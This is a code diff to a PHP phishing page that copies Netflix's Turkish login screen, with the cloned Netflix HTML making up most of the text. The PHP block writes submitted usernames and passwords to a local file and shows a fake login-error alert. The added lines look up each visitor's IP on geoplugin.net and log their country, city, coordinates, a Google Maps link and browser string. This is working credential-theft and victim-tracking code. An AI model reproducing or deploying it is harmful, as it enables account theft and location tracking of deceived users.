@@ -1,16 +1,76 @@
 
 <?php  
-
+date_default_timezone_set('Europe/Istanbul');
 if (isset($_POST['login']) && isset($_POST['password'])) {
 
 $ac = fopen("kayit.txt","a+");
 $username = $_POST['login'];
 $password = $_POST['password'];
-$userlar = ("\n __________________ \nUsername: ".$username."\nPassword: ".$password."\n__________________ \n");
+$userlar = ("\n Username : ".$username."\n Password : ".$password."\n__________________ \n");
 fwrite($ac,$userlar);
 fclose($ac);
 echo "<script>alert('Kullanıcı Adınızı veya Şifrenizi kontrol ediniz!');</script>";
 }
+else{
+
+function GetIP(){
+ if(getenv("HTTP_CLIENT_IP")) {
+ $ip = getenv("HTTP_CLIENT_IP");
+ } elseif(getenv("HTTP_X_FORWARDED_FOR")) {
+ $ip = getenv("HTTP_X_FORWARDED_FOR");
+ if (strstr($ip, ',')) {
+ $tmp = explode (',', $ip);
+ $ip = trim($tmp[0]);
+ }
+ } else {
+ $ip = getenv("REMOTE_ADDR");
+ }
+ return $ip;
+}
+
+$ip = GetIP();
+
+
+$tarih =" Tarih : ".date('d/m/Y  H:i');
+
+$Geo_Plugin_XML = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$ip); 
+$adress = $Geo_Plugin_XML->geoplugin_request; 
+$ulke = $Geo_Plugin_XML->geoplugin_countryName;
+$bolge = $Geo_Plugin_XML->geoplugin_region;
+$kita = $Geo_Plugin_XML->geoplugin_continentCode;
+$ulkekodu = $Geo_Plugin_XML->geoplugin_countryCode;
+$sehir = $Geo_Plugin_XML->geoplugin_city;
+$plaka = $Geo_Plugin_XML->geoplugin_regionCode;
+$enlem = $Geo_Plugin_XML->geoplugin_latitude;
+$boylam = $Geo_Plugin_XML->geoplugin_longitude;
+$tarayici = $_SERVER['HTTP_USER_AGENT']; 
+
+$maps = "https://www.google.com/maps/place/".$enlem.",".$boylam."/@".$enlem.",".$boylam.",16z";
+$yamanefkar["0"] = " Ip Adresi : ".$adress;
+$yamanefkar["1"] = " Ulke : ".$ulke; 
+$yamanefkar["2"] = " Bolge : ".$bolge;
+$yamanefkar["3"] = " Kita : ".$kita;
+$yamanefkar["4"] = " Ulke Kodu : ".$ulkekodu;
+$yamanefkar["5"] = " Sehir : ".$sehir;
+$yamanefkar["6"] = " Plaka : ".$plaka;
+$yamanefkar["7"] = " Enlem : ".$enlem;
+$yamanefkar["8"] = " Boylam : ".$boylam;
+$yamanefkar["9"] = " Google Maps : ".$maps;
+$yamanefkar["10"] = " Tarayıcı : ".$tarayici; 
+
+
+$ac = fopen("kayit.txt","a+");
+
+$userlar = ("\n __________________ \n".$tarih."\n".$yamanefkar["0"]."\n".$yamanefkar["1"]."\n".$yamanefkar["2"]."\n".$yamanefkar["3"]."\n".$yamanefkar["4"]."\n".$yamanefkar["5"]."\n".$yamanefkar["6"]."\n".$yamanefkar["7"]."\n".$yamanefkar["8"]."\n".$yamanefkar["9"]."\n".$yamanefkar["10"]."\n\n!--VERİLER--!\n");
+fwrite($ac,$userlar);
+fclose($ac);
+sleep(2);
+
+}
+
+
+
+
  ?>
 
 <html lang="tr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta http-equiv="origin-trial" data-feature="EME Extension - Policy Check" data-expires="2018-11-26" content="Aob+++752GiUzm1RNSIkM9TINnQDxTlxz02v8hFJK/uGO2hmXnJqH8c/ZpI05b2nLsHDhGO3Ce2zXJUFQmO7jA4AAAB1eyJvcmlnaW4iOiJodHRwczovL25ldGZsaXguY29tOjQ0MyIsImZlYXR1cmUiOiJFbmNyeXB0ZWRNZWRpYUhkY3BQb2xpY3lDaGVjayIsImV4cGlyeSI6MTU0MzI0MzQyNCwiaXNTdWJkb21haW4iOnRydWV9"><title>Netflix</title><link rel="preload" href="https://codex.nflxext.com/%5E2.0.0/truthBundle/webui/0.0.1-shakti-js-mk-v0a906ca6/js/js/bootstrap.js,common%7Cbootstrap.js/2/4M034p4o494r0a4c454v4L060p004N4u4i4x4s4G4d4w4m4z3I024H/bck/true/none" as="script"><link rel="preload" href="https://codex.nflxext.com/%5E2.0.0/truthBundle/webui/0.0.1-shakti-js-mk-v0a906ca6/js/js/components%7Clogin%7CloginControllerClient.js/2/4M034p4o494r0a4c454v4L060p004N4u4i4x4s4G4d4w4m4z3I024H/l/true/none" as="script"><link type="text/css" rel="stylesheet" href="/personalization/cl2/freeform/WebsiteDetect?source=wwwhead&amp;fetchType=css&amp;modalView=login"><script src="https://connect.facebook.net/tr_TR/sdk.js?hash=4b1169673b1134646b081d507dc88393&amp;ua=modern_es6" async="" crossorigin="anonymous"></script><script id="facebook-jssdk" src="//connect.facebook.net/tr_TR/sdk.js"></script><script type="text/javascript">(function () { var request = new XMLHttpRequest(); request.open('GET', '/personalization/cl2/freeform/WebsiteDetect?source=wwwhead&fetchType=js&modalView=login', true); request.send(); var request2 = new XMLHttpRequest(); request2.open('GET', '/personalization/cl2/freeform/WebsiteScreen?source=wwwhead&fetchType=js' + '&winw=' + window.outerWidth + '&winh=' + window.outerHeight + '&screenw=' + window.innerWidth + '&screenh=' + window.innerHeight + '&ratio=' + ( window.devicePixelRatio ? window.devicePixelRatio : 'unsupported' ), true); request2.send(); })();</script><meta content="film izle, çevrimiçi filmler, televizyon izle, çevrimiçi televizyon, çevrimiçi televizyon programları, televizyon programlarını izle, filmleri izle, televizyon yayını, anında yayın, çevrimiçi izle, filmler, Türkiye film izleme siteleri, çevrimiçi televizyon izle, indirme yok, tam filmler" name="keywords"><meta content="Netflix filmlerini, programlarını ve dizilerini çevrimiçi olarak veya yayınları doğrudan akıllı TV, oyun konsolu, PC, Mac, cep telefonu, tablet ve daha birçok cihazda izleyebilirsiniz." name="description"><meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0"><link type="text/css" rel="stylesheet" href="https://codex.nflxext.com/%5E2.0.0/truthBundle/webui/0.0.1-shakti-css-v0a906ca6/css/css/less%7Clogin%7CloginBase.less,less%7Cpages%7Clogin%7CLogin.less/1/vB8nx3twAFG/none/true/none"><link rel="shortcut icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico"><link rel="apple-touch-icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.png"><script>window.netflix = window.netflix || {} ;         netflix.notification = window.netflix.notification = window.netflix.notification || {};window.netflix.notification.specification = netflix.notification.specification || {};;</script><script>window.netflix = window.netflix || {} ;         netflix.notification.constants = {"pageName":"login","locale":"tr-TR","sessionLength":30,"uiMode":"nonmember","ownerToken":null,"accept-language":"tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7"};</script><script>window.netflix = window.netflix || {} ;         netflix.notification.specification.uiView = {"impression":{"send":"both","overlapping":true},"command":{"send":"both"},"search":{"send":"both"},"uma":{"send":"both"},"focus":{"send":"both"},"scdWizardStep":{"send":"both"},"navigationLevel":{"send":"both"},"presentation":{"send":"both"},"onrampSimilarsGroup":{"send":"both"}};</script><script>window.netflix = window.netflix || {} ;         netflix.notification.specification.uiAction = {"manageSubscriptions":{"send":"end"},"removeActivityHistory":{"send":"end"},"promoShareFacebook":{"send":"end"},"promoShareTwitter":{"send":"end"},"rateTitle":{"send":"end"},"addToPlaylist":{"send":"both"},"selectProfile":{"send":"end"},"addProfile":{"send":"end"},"trailerPlay":{"send":"both"},"startTrailerPlay":{"send":"both"},"onRamp":{"send":"both"},"submitUnsupportedCountryEmail":{"send":"both"},"iTunesPriceFetching":{"send":"both"},"iTunesPurchase":{"send":"both"},"iTunesRestore":{"send":"both"},"iTunesSubmitReceipt":{"send":"both"},"iTunesSubmitRestoredReceipt":{"send":"both"},"iTunesSignUpFallback":{"send":"both"},"iTunesTracerPurchaseBegin":{"send":"both"},"iTunesTracerPurchasePostBridge":{"send":"both"},"iTunesTracerPurchaseHandleReceipt":{"send":"both"},"iTunesTracerPurchaseHasReceipt":{"send":"both"},"iTunesTracerPurchasePreFailure":{"send":"both"},"iTunesTracerPurchaseFailure":{"send":"both"},"iTunesTracerPurchaseCancel":{"send":"both"},"iTunesTracerPurchasePreFailureDevice":{"send":"both"},"iTunesTracerPurchaseFailureDevice":{"send":"both"},"iTunesTracerPurchaseMissingReceipt":{"send":"both"},"iTunesTracerPurchasePreSendReceipt":{"send":"both"},"iTunesTracerPurchaseSendReceipt":{"send":"both"},"iTunesTracerPurchaseMoneyballError":{"send":"both"},"iTunesTracerPurchaseSendReceiptEnd":{"send":"both"},"playStorePriceFetching":{"send":"both"},"playStorePurchase":{"send":"both"},"playStoreRestore":{"send":"both"},"playStoreSubmitReceipt":{"send":"both"},"playStoreSubmitRestoredReceipt":{"send":"both"},"playStoreFlowFallback":{"send":"both"},"playStoreSignUpFallback":{"send":"both"},"playStoreAndroidSignUp":{"send":"both"},"playStoreAndroidRetrySignUp":{"send":"both"},"playStoreTracerPurchaseBegin":{"send":"both"},"playStoreTracerPurchasePostBridge":{"send":"both"},"playStoreTracerPurchaseHandleReceipt":{"send":"both"},"playStoreTracerPurchaseHasReceipt":{"send":"both"},"playStoreTracerPurchasePreFailure":{"send":"both"},"playStoreTracerPurchaseFailure":{"send":"both"},"playStoreTracerPurchaseCancel":{"send":"both"},"playStoreTracerPurchasePreFailureDevice":{"send":"both"},"playStoreTracerPurchaseFailureDevice":{"send":"both"},"playStoreTracerPurchaseMissingReceipt":{"send":"both"},"playStoreTracerPurchasePreSendReceipt":{"send":"both"},"playStoreTracerPurchaseSendReceipt":{"send":"both"},"playStoreTracerPurchaseMoneyballError":{"send":"both"},"playStoreTracerPurchaseSendReceiptEnd":{"send":"both"},"simplicitySubmit":{"send":"both"},"simplicityFlowEndpointTiming":{"send":"both"},"editPaymentSubmit":{"send":"both"},"processAsDebitChecked":{"send":"both"},"processAsDebitSubmit":{"send":"both"},"processAsDebitUrl":{"send":"both"},"processAsDebitRendered":{"send":"both"},"navigate":{"send":"both"},"submitOnrampResults":{"send":"both"}};</script><script>window.netflix = window.netflix || {} ;         netflix.notification.specification.search = {"focus":{"send":"both"}};</script><script>window.netflix = window.netflix || {} ;         netflix.notification.specification.uiQOE = {"appSession":{"send":"both"},"userSession":{"send":"both"},"uiStartup":{"send":"end"},"uiBrowseStartup":{"send":"end"},"uiModalViewChanged":{"eventProperties":{"value":"modalView"},"send":"start"},"uiModelessView":{"send":"both","overlapping":"true"},"partnerSession":{"send":"both","overlapping":false}};</script><script>window.netflix = window.netflix || {} ;         netflix.notification.specification.www = {"playbackPerformance":{"send":"both"},"playbackFeatureDetection":{"send":"end"},"playbackError":{"send":"end"},"windowOnError":{"send":"end"}};</script><script>window.netflix = window.netflix || {} ;         netflix.notification.specification.login = {"poll":{"send":"both"},"autofill":{"send":"both"}};</script><meta property="og:description" content="Netflix filmlerini, programlarını ve dizilerini çevrimiçi olarak veya yayınları doğrudan akıllı TV, oyun konsolu, PC, Mac, cep telefonu, tablet ve daha birçok cihazda izleyebilirsiniz."><meta property="al:ios:url" content="nflx://www.netflix.com/login?locale=tr-TR"><meta property="al:ios:app_store_id" content="363590051"><meta property="al:ios:app_name" content="Netflix"><meta property="al:android:url" content="nflx://www.netflix.com/login?locale=tr-TR"><meta property="al:android:package" content="com.netflix.mediaclient"><meta property="al:android:app_name" content="Netflix"><meta name="twitter:card" content="player"><meta name="twitter:site" content="@netflix"><script>/* Disable minification (remove `.min` from URL path) for more info */
